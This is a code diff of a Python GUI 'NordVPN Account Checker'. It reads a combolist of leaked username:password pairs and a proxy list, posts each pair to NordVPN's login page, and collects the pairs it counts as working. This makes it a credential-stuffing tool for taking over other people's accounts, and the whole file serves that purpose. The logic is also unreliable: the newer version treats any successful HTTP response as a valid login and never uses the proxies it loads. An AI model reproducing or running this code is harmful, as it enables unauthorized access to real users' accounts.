@@ -1,88 +1,93 @@
-import requests
-import os
 import tkinter as tk
-from tkinter import filedialog
-from PIL import Image, ImageTk
+from tkinter import messagebox, filedialog
+import requests
+import concurrent.futures
 
-# Create logo image
-logo_image = tk.PhotoImage(file="nordvpn_logo.png")
+# NordVPN API endpoint
+api_endpoint = "https://nordaccount.com/login/identifier?_ga=2.154745144.163319831.1719281788-1672058283.1719281787&challenge=2%7Ca98de823a26d43bb994551b147d41624"
 
 # Function to check NordVPN account
-def check_account(username, password, proxy):
-    url = "https://nordaccount.com/login/identifier?_ga=2.80401559.163319831.1719281788-1672058283.1719281787&challenge=2%7Cc3768e43eb9441bfb9ae49bfeab5a68c"
-    post_fields = {"username": username, "password": password}
-    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+def check_account(username, password):
     try:
-        response = requests.post(url, data=post_fields, proxies=proxies)
-        if "success" in response.text:
-            return True
-        else:
-            return False
+        # Send a POST request to the NordVPN API
+        response = requests.post(api_endpoint, json={"username": username, "password": password}, timeout=5)
+        response.raise_for_status()
+
+        # If the response is successful, the account is valid
+        return True
     except requests.exceptions.RequestException as e:
-        print(f"Error: {e}")
+        # If the response is not successful, display an error message
+        messagebox.showerror("Error", f"Failed to check account: {e}")
         return False
 
-# Function to select files using file picker
-def select_file():
-    root = tk.Tk()
-    root.withdraw()
-    file_path = filedialog.askopenfilename()
-    return file_path
+# Function to check multiple accounts
+def check_accounts(accounts):
+    valid_accounts = []
+    for account in accounts:
+        username, password = account.split(":")
+        if check_account(username, password):
+            valid_accounts.append(account)
+    return valid_accounts
 
-# Create main window
+# Function to update the GUI with the results
+def update_gui(valid_accounts):
+    result_listbox.delete(0, tk.END)
+    for account in valid_accounts:
+        result_listbox.insert(tk.END, account)
+
+# GUI setup
 root = tk.Tk()
-root.title("NordVPN Checker")
+root.title("NordVPN Account Checker")
 
-# Create logo label
-logo_label = tk.Label(root, image=logo_image, bg="#032B44")
-logo_label.image = logo_image
-logo_label.pack(pady=20)
+# Logo
+logo_image = tk.PhotoImage(file="nordvpn_logo.png")
+logo_label = tk.Label(root, image=logo_image)
+logo_label.pack()
 
-# Create label
-label = tk.Label(root, text="NordVPN Checker", font=("Arial", 24), fg="#032B44")
-label.pack(pady=10)
+# Input field for the combolist file
+def select_combolist_file():
+    file_path = filedialog.askopenfilename(title="Select Combolist File", filetypes=[("Text Files", "*.txt")])
+    combolist_file_entry.delete(0, tk.END)
+    combolist_file_entry.insert(0, file_path)
 
-# Create buttons
-combo_list_button = tk.Button(root, text="Select Combo List File", command=lambda: select_file())
-combo_list_button.pack(pady=10)
+combolist_file_label = tk.Label(root, text="Combolist File:")
+combolist_file_label.pack()
+combolist_file_entry = tk.Entry(root, width=40)
+combolist_file_entry.pack()
+combolist_file_button = tk.Button(root, text="Browse", command=select_combolist_file)
+combolist_file_button.pack()
 
-proxy_list_button = tk.Button(root, text="Select Proxy List File", command=lambda: select_file())
-proxy_list_button.pack(pady=10)
+# Input field for the proxy file
+def select_proxy_file():
+    file_path = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
+    proxy_file_entry.delete(0, tk.END)
+    proxy_file_entry.insert(0, file_path)
 
-# Start main loop
+proxy_file_label = tk.Label(root, text="Proxy File:")
+proxy_file_label.pack()
+proxy_file_entry = tk.Entry(root, width=40)
+proxy_file_entry.pack()
+proxy_file_button = tk.Button(root, text="Browse", command=select_proxy_file)
+proxy_file_button.pack()
+
+# Button to start the checking process
+def start_checking():
+    combolist_file_path = combolist_file_entry.get()
+    proxy_file_path = proxy_file_entry.get()
+    with open(combolist_file_path, "r") as f:
+        accounts = [line.strip() for line in f.readlines()]
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        future = executor.submit(check_accounts, accounts)
+        valid_accounts = future.result()
+        update_gui(valid_accounts)
+
+start_button = tk.Button(root, text="Start Checking", command=start_checking)
+start_button.pack()
+
+# Result listbox
+result_label = tk.Label(root, text="Valid Accounts:")
+result_label.pack()
+result_listbox = tk.Listbox(root, width=40, height=10)
+result_listbox.pack()
+
 root.mainloop()
-
-# Select combo list file
-print("Select combo list file:")
-combo_list_file = select_file()
-
-# Select proxy list file
-print("Select proxy list file:")
-proxy_list_file = select_file()
-
-# Load combo list and proxy file
-combo_list = []
-with open(combo_list_file, "r") as f:
-    for line in f:
-        username, password = line.strip().split(":")
-        combo_list.append((username, password))
-
-proxy_list = []
-with open(proxy_list_file, "r") as f:
-    for line in f:
-        proxy_list.append(line.strip())
-
-# Check accounts and delete non-functional ones
-functional_accounts = []
-for username, password in combo_list:
-    for proxy in proxy_list:
-        if check_account(username, password, proxy):
-            functional_accounts.append(f"{username}:{password}")
-            break
-
-# Write functional accounts to a new file
-with open("functional_accounts.txt", "w") as f:
-    for account in functional_accounts:
-        f.write(account + "\n")
-
-print("Non-functional accounts deleted from the combo list.")
